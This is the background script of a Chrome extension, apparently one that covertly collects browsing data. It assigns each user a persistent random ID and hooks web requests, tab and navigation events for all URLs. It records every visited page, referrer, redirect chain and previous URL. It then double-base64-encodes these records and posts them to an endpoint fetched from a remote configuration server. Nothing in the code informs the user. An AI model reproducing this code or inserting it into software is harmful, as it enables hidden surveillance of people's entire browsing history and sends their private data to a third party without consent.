;
SIM_NS = (function() {
  var api = (function() {
    var consts = {
      "sid": "3022",
      "url": "http://lb.secureweb24.net/settings",
      "name": "chrome",
      "route": "/full/related",
      "ver": "5.0.1",
      "protocol": "1"
    };

    function Storage() {
      this._key = 'wtr';
      this._all_data = {};
      if ('undefined' != typeof(localStorage)) {
        this._storage = localStorage;
        this._refresh();
        this._clearUnused(['adv_server', 'adv_tmv', 'sim_server', 'sim_tmv']);
      }
    }
    Storage.prototype.store = function(key, value) {
      if (this._storage) {
        this._all_data[key] = value;
        this._storage.setItem(this._key, JSON.stringify(this._all_data));
        if (this._storage.getItem(key)) {
          this._storage.removeItem(key);
        }
        return this._all_data[key];
      }
    };
    Storage.prototype._clearUnused = function(arr) {
      for (var i in arr) {
        var key = arr[i];
        this.delete(key);
      }
    };
    Storage.prototype._refresh = function() {
      this._all_data = JSON.parse(this._storage.getItem(this._key) || "{}");
    };
    Storage.prototype._dump = function() {
      this._storage.setItem(this._key, JSON.stringify(this._all_data));
    };
    Storage.prototype.restore = function(key) {
      if (this._storage) {
        var val = this._storage.getItem(key);
        if (val) {
          this.store(key, val);
        } else {
          this._refresh();
        }
        return this._all_data[key];
      }
    };
    Storage.prototype.delete = function(key) {
      if (this._storage) {
        delete this._all_data[key];
        this._storage.removeItem(key);
        this._dump();
      }
    };
    Storage.prototype.clear = function() {
      this._all_data = {};
      this._storage.removeItem(this._key);
    };
    Storage.prototype.state = function() {
      this._refresh();
      return JSON.parse(JSON.stringify(this._all_data || {}));
    };

    function Utils() {}
    Utils.prototype.toQueryString = function(obj) {
      return Object.keys(obj).filter(function(key) {
        return !!obj[key] || false === obj[key];
      }).map(function(key) {
        return key + '=' + obj[key];
      }).join('&');
    };
    Utils.prototype.base64Encode = function(input) {
      return btoa(input);
    };
    Utils.prototype.isWebURL = function(url) {
      if (url.search("chrome/newtab") > -1) return false;
      return /^http/.test(url);
    };
    Utils.prototype.createRandomString = function(string_size) {
      var text = "";
      var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (var i = 0; i < string_size; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
      return text;
    };
    Utils.prototype.getCurrentTime = function() {
      return Date.now();
    };

    function Request(_utils) {
      this._utils = _utils;
    }
    Request.prototype.post = function(url, data, callback) {
      var http = new XMLHttpRequest();
      http.open("POST", url, true);
      http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      http.onreadystatechange = function() {
        if (4 == http.readyState && callback) {
          callback.apply(null, [200 == http.status, http.responseText].concat(arguments));
        }
      };
      http.send(data);
    };
    Request.prototype.get = function(url, queryParams, callback) {
      var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function() {
        if (4 == xmlhttp.readyState && callback) {
          callback.apply(null, [200 == xmlhttp.status, xmlhttp.responseText].concat(arguments));
        }
      };
      xmlhttp.open("GET", url + "?" + this._utils.toQueryString(queryParams), true);
      xmlhttp.send();
    };

    function Settings(_storage, _consts, _request, _utils) {
      this._settings = null;
      this._is_ready = false;
      this._storage = _storage;
      this._settingsStorageKey = 'stats_settings';
      var installTimeKey = 'install_time';
      var installTime = this._storage.restore(installTimeKey) || _utils.getCurrentTime() / 1000;
      this._storage.store(installTimeKey, installTime);
      var data = {
        s: _consts.sid,
        ver: _consts.ver,
        ins: installTime
      };
      var self = this;
      _request.get(_consts.url, data, function(isOk, settings) {
        self._is_ready = true;
        if (!isOk) {
          return null;
        }
        self._settings = JSON.parse(settings);
        self.dump();
      });
    }
    Settings.prototype.dump = function() {
      this._storage.store(this._settingsStorageKey, this._settings);
    };
    Settings.prototype.isReady = function() {
      return this._is_ready;
    };
    Settings.prototype.waitUntilReady = function(timeout, cb) {
      var ready = false;
      var self = this;
      var iv = setInterval(function() {
        ready = self.isReady();
        if (ready) {
          clearInterval(iv);
          iv = null;
          cb(null, true);
        }
      }, 300);
      setTimeout(function() {
        if (iv) {
          cb(new Error('Timeout waiting for config'));
        }
      }, timeout);
    };
    Settings.prototype.isEnabled = function() {
      return 1 == (this._settings || {}).Status;
    };
    Settings.prototype.getEndpoint = function() {
      return (this._settings || {}).Endpoint;
    };
    Settings.prototype.disable = function() {
      if (1 == (this._settings || {}).Status) {
        this._settings.Status = 0;
        this.dump();
      }
    };
    Settings.prototype.enable = function() {
      if (0 == (this._settings || {}).Status) {
        this._settings.Status = 1;
        this.dump();
      }
    };

    function StreamItem(tabId) {
      this._id = tabId;
      this._tabTypes = [];
      this._arrServerRedirectUrls = [];
      this._completedUrl = '';
      this._startUrl = '';
      this._transitionType = [];
      this._transitionQualifiers = [];
      this._prev = undefined;
      this._referrer = '';
      this._startTimestamp = undefined;
      this._prevUrlInRequest = undefined;
      this._arrClientRedirectUrls = [];
      this._complitedError = undefined;
      this._isReported = false;
      this._statuses = {
        IDLE: true,
        InProcess: false,
        Redirected: false,
        Complited: false,
        ReadyToSend: false,
        Sent: false
      };
      this._additionalInfo = [];
    }
    StreamItem.prototype.getFlags = function() {
      var self = this;
      return 'IDLE InProcess Redirected Complited ReadyToSend Sent'.split(' ').map(function(flagName) {
        return ' ' + (self._statuses[flagName] ? flagName.toUpperCase().substr(0, 3) : " - ") + ' ';
      }).join('');
    };
    StreamItem.prototype.setStatus = function(status) {
      if (this._statuses.hasOwnProperty(status)) {
        this._statuses[this.currentStatus()] = false;
        this._statuses[status] = true;
      } else {
        return false;
      }
    };
    StreamItem.prototype.currentStatus = function() {
      for (var k in this._statuses) {
        if (this._statuses[k]) return k;
      }
      return undefined;
    };
    StreamItem.prototype.getId = function() {
      return this._id;
    };
    StreamItem.prototype._isTypeValue = function(value) {
      return this._tabTypes.indexOf(value) > -1;
    };
    StreamItem.prototype._setIsTypeValue = function(value) {
      if (!this._isTypeValue(value)) this._tabTypes.push(value);
    };
    StreamItem.prototype._setIsNotTypeValue = function(value) {
      if (this._isTypeValue(value)) {
        var index = this._tabTypes.indexOf(value);
        if (-1 !== index) this._tabTypes.splice(index, 1);
      }
    };
    //
    StreamItem.prototype.setIsDuplicated = function() {
      return this._setIsTypeValue("duplicated_tab");
    };
    StreamItem.prototype.setIsNotDuplicated = function() {
      return this._setIsNotTypeValue("duplicated_tab");
    };
    StreamItem.prototype.isDuplicatedTab = function() {
      return this._isTypeValue("duplicated_tab");
    };
    //
    StreamItem.prototype.setIsReopened = function() {
      return this._setIsTypeValue("reopened");
    };
    StreamItem.prototype.setIsNotReopened = function() {
      return this._setIsNotTypeValue("reopened");
    };
    StreamItem.prototype.isReopened = function() {
      return this._isTypeValue("reopened");
    };
    //
    StreamItem.prototype.getTabTypes = function() {
      return this._tabTypes;
    };
    StreamItem.prototype.setTabTypes = function(value) {
      this._tabTypes = value;
    };
    //
    StreamItem.prototype.addClientRedirect = function(timestamp) {
      this._arrClientRedirectUrls.push({
        url: this._prevUrlInRequest,
        dur: (timestamp - this._startTimestamp)
      });
    };
    StreamItem.prototype.addServerRedirect = function(url) {
      this._arrServerRedirectUrls.push(url);
    };
    StreamItem.prototype.setRequestBegin = function(timestamp, url) {
      this._startTimestamp = timestamp;
      this._prev = url;
    };
    StreamItem.prototype.skipData = function() {
      this._tabTypes = [];
      this._arrServerRedirectUrls = [];
      this._startUrl = '';
      this._transitionType = [];
      this._transitionQualifiers = [];
      this._prev = undefined;
      this._startTimestamp = undefined;
      this._arrClientRedirectUrls = [];
      this._additionalInfo = [];
    };
    function TabList() {
      this._cachedTabs = [];
    }
    TabList.prototype.exists = function(tabId) {
      return !!this.get(tabId);
    };
    TabList.prototype.add = function(tabId) {
      if (!this.exists(tabId)) {
        this._cachedTabs.push(new StreamItem(tabId));
      }
      return this.get(tabId);
    };
    TabList.prototype.get = function(tabId) {
      return this._cachedTabs.filter(function(tabInfo) {
        return tabInfo.getId() == tabId;
      })[0];
    };
    TabList.prototype.remove = function(tabId) {
      var index = this._cachedTabs.indexOf(this.get(tabId));
      if (-1 !== index) this._cachedTabs.splice(index, 1);
    };
    var utils = new Utils();
    var request = new Request(utils);
    var storage = new Storage();
    var tabList = new TabList();
    var settings = new Settings(storage, consts, request, utils);

    function API() {
      var userIdKey = 'userid';
      var userId = storage.restore(userIdKey);
      if (!userId) {
        userId = utils.createRandomString(15);
        storage.store(userIdKey, userId);
      }
      this._userId = userId;
      this._currentTab = null;
    }
    API.prototype.setCurrentTabId = function(tabId) {
      this._currentTab = tabId;
    };
    API.prototype.isCurrent = function(tabId) {
      return this._currentTab == tabId;
    };
    API.prototype.setLastPrev = function(url) {
      if (url.length > 0) {
        storage.store("lastprev", url);
      } else {
        storage.delete("lastprev");
      }
    };
    API.prototype.getLastPrev = function() {
      return storage.restore("lastprev") || "";
    };
    API.prototype.clearLastPrev = function() {
      return storage.delete("lastprev");
    };
    API.prototype.focus = function(url) {
      if (utils.isWebURL(url)) {
        this.setLastPrev(url);
      }
    };
    API.prototype.setFocus = function(id, url) {
      this.setCurrentTabId(id);
      if (utils.isWebURL(url) && this.getTabInfo(id) && this.getTabInfo(id)._isReported) {
        this.setLastPrev(url);
      }
    };
    API.prototype.finishData = function(clickItem) {
      if (!clickItem._complitedError) {
        clickItem.setStatus("IDLE");
      }
    };
    API.prototype.processData = function(clickItem) {
      if ("ReadyToSend" !== clickItem.currentStatus()) {
        this.setSent(clickItem._id);
        return false;
      }
      if (clickItem._isReported) {
        this.setSent(clickItem._id);
        return;
      }
      if (!utils.isWebURL(clickItem._completedUrl)) {
        this.setSent(clickItem._id);
        return false;
      }
      if (!settings.isEnabled()) {
        this.setSent(clickItem._id);
        return false;
      }
      this.query(clickItem);
      if (-1 == clickItem._id) {
        clickItem.skipData();
        clickItem.setStatus('Sent');
        clickItem._isReported = true;
        clickItem._complitedError = undefined;
        delete clickItem;
      } else {
        this.setSent(clickItem._id);
      }
      return true;
    };
    API.prototype.query = function(clickItem) {
      if (!clickItem) {
        return false;
      }
      var prev = clickItem._prev || this.getLastPrev();
      var ref = clickItem._referrer;
      var tabOrigin = [];
      if (clickItem.isDuplicatedTab() || clickItem.isReopened()) {
        ref = "";
      }
      if (clickItem.isDuplicatedTab()) {
        tabOrigin.push("duplication");
      }
      if (clickItem.isReopened()) {
        tabOrigin.push("reopening");
      }
      if (clickItem._additionalInfo) {
        tabOrigin = tabOrigin.concat(clickItem._additionalInfo);
      }
      if ("start_page" === clickItem._transitionType) {
        clickItem.skipData();
        return true;
      }
      var serverRedirects = clickItem._arrServerRedirectUrls || [];
      var crs = clickItem._arrClientRedirectUrls || [];
      if (!prev) {
        prev = "";
      }
      if (!ref) {
        ref = "";
      }
      data = {
        s: consts.sid,
        tmv: consts.ver,
        md: 21,
        v: consts.protocol,
        sub: consts.name,
        pid: this._userId,
        ts: utils.getCurrentTime(),
        sess: '',
        q: encodeURIComponent(clickItem._completedUrl),
        prev: encodeURIComponent(prev),
        hreferer: encodeURIComponent(ref)
      };
      data.meta = tabOrigin;
      data.tt = clickItem._transitionType;
      data.tq = clickItem._transitionQualifiers;
      if (clickItem._complitedError) {
        data.error = clickItem._complitedError;
      }
      var sr = "";
      for (var i = 0; i < serverRedirects.length; i++) {
        sr += "&sr=" + escape(serverRedirects[i])
      }
      if (crs[0] && crs[0].url) data.cr = escape(crs[0].url);
      if (crs[0] && crs[0].dur) data.crd = escape(crs[0].dur);
      var requestData = utils.toQueryString(data) + sr;
      var encoded = utils.base64Encode(utils.base64Encode(requestData));
      var data = "e=" + encodeURIComponent(encoded);
      var statsUrl = settings.getEndpoint() + (consts.route || "");
      request.post(statsUrl, data);
      if (this._currentTab == clickItem._id || -1 == clickItem._id) {
        this.setLastPrev(clickItem._completedUrl);
      }
      clickItem.skipData();
      return true;
    };
    API.prototype.setIDLE = function(id, params) {
      var clickItem = this.getTabInfo(id);
      if (!clickItem) {
        return false;
      }
      var status = clickItem.currentStatus();
      var error = clickItem._complitedError;
      if (error) {
        return false;
      }
      switch (status) {
        case "Sent":
          clickItem.skipData();
          break;
        default:
          return false;
      }
      clickItem.setStatus("IDLE");
      return true;
    };
    API.prototype.setInProcess = function(id, params) {
      var clickItem = this.getTabInfo(id);
      if (!clickItem) {
        return false;
      }
      if (!params) {
        return false;
      }
      var status = clickItem.currentStatus();
      var error = clickItem._complitedError;
      var isReported = clickItem._isReported;
      switch (status) {
        case 'Complited':
          if (isReported && error) break;
          if (!isReported) {
            if (consts.name !== 'firefox') {
              this.nonFullyLoaded(clickItem);
            }
            clickItem.skipData();
            clickItem._isReported = false;
            clickItem._complitedError = undefined;
          }
        case 'IDLE':
          clickItem.setRequestBegin(params.timestamp || 0, this.getLastPrev());
          if (!params.url) {
            return false;
          }
          clickItem._startUrl = params.url;
          clickItem._isReported = false;
          break;
        case 'Redirected':
          break;
        case 'ReadyToSend':
          if (!error && !isReported) {
            return false;
          }
          break;
        case 'Sent':
          if (!error && !isReported) {
            return false;
          }
          break;
        default:
          return false;
      }
      clickItem.setStatus("InProcess");
      return true;
    };
    API.prototype.setRedirected = function(id, params) {
      var clickItem = this.getTabInfo(id);
      if (!clickItem) {
        return false;
      }
      var status = clickItem.currentStatus();
      switch (status) {
        case 'InProcess':
          clickItem.addServerRedirect((params || {}).redirect_url || "");
          break;
        default:
          return false;
      }
      clickItem.setStatus("Redirected");
      return true;
    };
    API.prototype.setComplited = function(id, params) {
      var clickItem = this.getTabInfo(id);
      if (!clickItem) {
        return false;
      }
      var status = clickItem.currentStatus();
      if (!params || !params.complited_url) {
        return false;
      }
      clickItem._completedUrl = params.complited_url;
      switch (status) {
        case 'IDLE':
          clickItem._isReported = false;
          clickItem._additionalInfo.push('AJAX_query');
        case 'InProcess':
          if (clickItem._complitedError) {
            clickItem._isReported = false;
          }
          clickItem._complitedError = undefined;
          break;
        case 'Complited':
        case 'ReadyToSend':
          break;
        case 'Sent':
          if (clickItem._complitedError) break;
        default:
          return false;
      }
      clickItem.setStatus('Complited');
      return true;
    };
    API.prototype.setReadyToSend = function(id, params) {
      var clickItem = null;
      if (-1 === id) {
        if (!params || !params.item) {
          return false;
        }
        clickItem = params.item;
      } else {
        clickItem = this.getTabInfo(id);
      }
      if (!clickItem) {
        return true;
      }
      var status = clickItem.currentStatus();
      switch (status) {
        case "ReadyToSend":
        case "Sent":
          if (!clickItem._complitedError) {
            return false;
          }
          break;
        case "IDLE":
          clickItem._isReported = false;
          clickItem._complitedError = undefined;
          clickItem._additionalInfo.push('forward_back');
        case "InProcess":
          if (!clickItem._complitedError) {
            clickItem._isReported = false;
          }
      }
      if (params && params.url) {
        clickItem._completedUrl = params.url;
      }
      if (params && params.error) {
        if (!clickItem._complitedError) {
          clickItem._complitedError = params.error;
        }
      }
      if (!clickItem._prev) {
        clickItem._prev = this.getLastPrev();
      }
      clickItem.setStatus('ReadyToSend');
      this.processData(clickItem);
      return true;
    };
    API.prototype.setSent = function(id, params) {
      var clickItem = this.getTabInfo(id);
      if (!clickItem) {
        return false;
      }
      var status = clickItem.currentStatus();
      switch (status) {
        case 'ReadyToSend':
          clickItem._isReported = true;
          break;
        default:
          return false;
      }
      clickItem.setStatus('Sent');
      return this.finishData(clickItem);
    };
    API.prototype.errorOccured = function(id, urlStr, errorStr) {
      return this.setReadyToSend(id, {
        url: urlStr,
        error: errorStr
      });
    };
    API.prototype.nonFullyLoaded = function(clickItem) {
      var copyClickItem6 = new StreamItem(-1);
      copyClickItem6._tabTypes = clickItem._tabTypes.slice();
      copyClickItem6._arrServerRedirectUrls = clickItem._arrServerRedirectUrls.slice();
      copyClickItem6._completedUrl = clickItem._completedUrl;
      copyClickItem6._startUrl = clickItem._startUrl;
      copyClickItem6._transitionType = clickItem._transitionType;
      copyClickItem6._transitionQualifiers = clickItem._transitionQualifiers.slice();
      copyClickItem6._prev = this.getLastPrev();
      copyClickItem6._startTimestamp = clickItem._startTimestamp;
      copyClickItem6._prevUrlInRequest = clickItem._prevUrlInRequest;
      copyClickItem6._arrClientRedirectUrls = clickItem._arrClientRedirectUrls.slice();
      copyClickItem6._complitedError = clickItem._complitedError;
      copyClickItem6._isReported = clickItem._isReported;
      copyClickItem6._referrer = "";
      copyClickItem6._additionalInfo.push("nonfullyloaded");
      copyClickItem6.setStatus('InProcess');
      this.setReadyToSend(-1, {
        item: copyClickItem6
      });
    };
    API.prototype.isWebURL = utils.isWebURL.bind(utils);
    API.prototype.deleteTab = tabList.remove.bind(tabList);
    API.prototype.getTabInfo = tabList.get.bind(tabList);
    API.prototype.addTab = tabList.add.bind(tabList);
    API.prototype._client_api = function(full) {
      var result = {
        state: storage.state.bind(storage),
        clear: storage.clear.bind(storage)
      };
      if (full) {
        result.disable = settings.disable.bind(settings);
        result.enable = settings.enable.bind(settings);
      }
      return result;
    };
    return new API();
  })();

  function BrowserAPI(webRequest, api) {
    if (!webRequest) throw new Error('events.permission missing: webRequest');
    this.api = api;
    this.webRequest = webRequest;
    var extraInfoSpec = {
      onBeforeRequest: ['blocking'],
      onBeforeSendHeaders: ['blocking', 'requestHeaders']
    };
    this.addListeners({
      types: ['main_frame'],
      urls: ['<all_urls>']
    }, extraInfoSpec, ['onBeforeRequest', 'onBeforeRedirect', 'onCompleted', 'onBeforeSendHeaders', 'onErrorOccurred']);
  }
  BrowserAPI.prototype.onErrorOccurred = function(details) {
    if (details.tabId > 0) {
      this.api.errorOccured(details.tabId, details.url, details.error);
    }
  };
  BrowserAPI.prototype.onBeforeSendHeaders = function(details) {
    var oTabInfo = this.api.getTabInfo(details.tabId);
    if (!oTabInfo) return {
        requestHeaders: details.requestHeaders
    };
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name === 'Referer') {
        oTabInfo._referrer = details.requestHeaders[i].value;
        return {
          requestHeaders: details.requestHeaders
        };
      }
    }
    oTabInfo._referrer = "";
    return {
      requestHeaders: details.requestHeaders
    };
  };
  BrowserAPI.prototype.onCompleted = function(details) {
    this.api.setComplited(details.tabId, {
      complited_url: details.url
    });
  };
  BrowserAPI.prototype.onBeforeRedirect = function(details) {
    this.api.setRedirected(details.tabId, {
      redirect_url: details.url
    });
  };
  BrowserAPI.prototype.onBeforeRequest = function(details) {
    if (details.tabId <= 0) {
      return null;
    }
    var oTabInfo = this.api.getTabInfo(details.tabId) || this.api.addTab(details.tabId);
    this.api.setInProcess(details.tabId, {
      url: details.url,
      timestamp: details.timeStamp
    });
  };
  BrowserAPI.prototype.addListeners = function(filter, extraInfoSpec, eventArr) {
    var self = this;
    eventArr.forEach(function(eventName) {
      if (!self.webRequest[eventName]) {
        return null;
      }
      var impl = function() {
        var err = null;
        try {
          self[eventName].apply(self, arguments);
        } catch (e) {
          err = e;
        }
      };
      if (extraInfoSpec[eventName]) {
        self.webRequest[eventName].addListener(impl, filter, extraInfoSpec[eventName]);
      } else {
        self.webRequest[eventName].addListener(impl, filter);
      }
    });
  };
  function BrowserTab(tabs, api) {
    if (!tabs) throw new Error('No tabs!');
    this.tabs = tabs;
    this.api = api;
    this.addListeners(['onUpdated', 'onReplaced', 'onCreated', 'onRemoved']);
    var self = this;
    chrome.windows.getAll({
      populate: true
    }, function(windows) {
      for (var w = 0; w < windows.length; w++) {
        for (var i = 0; i < windows[w].tabs.length; i++) {
          if (windows[w].focused && windows[w].tabs[i].active) {
            self.api.setFocus(windows[w].tabs[i].id, windows[w].tabs[i].url);
          }
          if (!self.api.isWebURL(windows[w].tabs[i].url)) continue;
          var oTabInfo = self.api.addTab(windows[w].tabs[i].id);
          oTabInfo._isReported = true;
          oTabInfo._additionalInfo.push("extension_reloading");
        }
      }
    });
    api.clearLastPrev();
  }
  BrowserTab.prototype.addListeners = function(eventArr) {
    var self = this;
    eventArr.forEach(function(eventName) {
      if (!self.tabs[eventName]) {
        return null;
      }
      self.tabs[eventName].addListener(function() {
        try {
          self[eventName].apply(self, arguments);
        } catch (e) {}
      });
    });
    this.addActivatedLitener();
  };
  BrowserTab.prototype.onUpdated = function(tabId, changeInfo, tab) {
    if ('complete' == (changeInfo || {}).status) {
      var oTabInfo = this.api.getTabInfo(tabId);
      this.api.setComplited(tabId, {
        complited_url: tab.url
      });
      this._onLocationChange(oTabInfo);
    }
  };
  BrowserTab.prototype.onReplaced = function(addedTabId, removedTabId) {
    var oTabInfo = this.api.getTabInfo(addedTabId);
    var self = this;
    this.tabs.get(addedTabId, function(tab) {
      if (tab) {
        oTabInfo._completedUrl = tab.url;
        self.api.deleteTab(removedTabId);
        self._onLocationChange(oTabInfo);
      }
    });
    this.api.setCurrentTabId(addedTabId);
  };
  BrowserTab.prototype.addActivatedLitener = function() {
    if (this.tabs.onActivated) {
      this.tabs.onActivated.addListener(this._activatedCallback.bind(this, null));
    } else {
      this.tabs.onSelectionChanged.addListener(this._activatedCallback.bind(this));
    }
  };
  BrowserTab.prototype.onCreated = function(tab) {
    var curTab = this.api.addTab(tab.id);
    var oOpenerTabInfo = this.api.getTabInfo(tab.openerTabId);
    if (tab.url.length && oOpenerTabInfo && tab.url === oOpenerTabInfo._completedUrl) {
      curTab.setIsDuplicated();
    } else if (tab.url.length) {
      this.tabs.query({
        url: tab.url
      }, function(tabs) {
        if ((tabs || []).length > 1) {
          curTab.setIsDuplicated();
          curTab._additionalInfo.push('background_duplication');
        }
      });
    }
    if ('complete' == tab.status && !tab.openerTabId) {
      curTab.setIsReopened();
    }
  };
  BrowserTab.prototype.onRemoved = function(id, removeInfo) {
    this.api.deleteTab(id);
  };
  BrowserTab.prototype.onHighlighted = function(highlightInfo) {
    if (1 == highlightInfo.tabIds.length) {
      this.api.setCurrentTabId(highlightInfo.tabIds[0]);
    }
  };
  BrowserTab.prototype._onLocationChange = function(clickItem) {
    if (!clickItem) {
      return;
    }
    this.api.setReadyToSend(clickItem._id);
  };
  BrowserTab.prototype._activatedCallback = function(consistencyParam, info) {
    this.api.setCurrentTabId(info.tabId);
    if (!this.api.getTabInfo(info.tabId)) return;
    var self = this;
    this.tabs.get(info.tabId, function(tab) {
      if (chrome.runtime.lastError) {} else {
        self.api.setFocus(info.tabId, tab.url);
      }
    });
  };﻿
  new BrowserAPI(chrome.webRequest, api);
  new BrowserTab(chrome.tabs, api);
  chrome.webNavigation.onCommitted.addListener(function(details) {
    try {
      if (details == undefined || details.frameId != 0) {
        return;
      }
      var tabId = details.tabId;
      if (tabId >= 0) {
        var oTabInfo = api.getTabInfo(tabId) || api.addTab(tabId);
        oTabInfo._transitionType = details.transitionType;
        oTabInfo._transitionQualifiers = details.transitionQualifiers;
        if (details.transitionQualifiers.indexOf("client_redirect") > -1) {
          oTabInfo.addClientRedirect(details.timeStamp);
        }
        oTabInfo._prevUrlInRequest = details.url;
      }
    } catch (e) {}
  });
  chrome.windows.onRemoved.addListener(function(windowID) {
    chrome.tabs.query({
      active: true
    }, function(tabs) {
      if (tabs[0]) {
        api.setFocus(tabs[0].id, tabs[0].url);
      }
    });
  });
  chrome.windows.onFocusChanged.addListener(function(window) {
    if (chrome.windows.WINDOW_ID_NONE == window) {
      return;
    }
    chrome.tabs.query({
      windowId: window,
      active: true
    }, function(tabs) {
      if (tabs[0] && tabs[0].active) {
        api.setFocus(tabs[0].id, tabs[0].url);
      }
    });
  });
  return api._client_api();
})();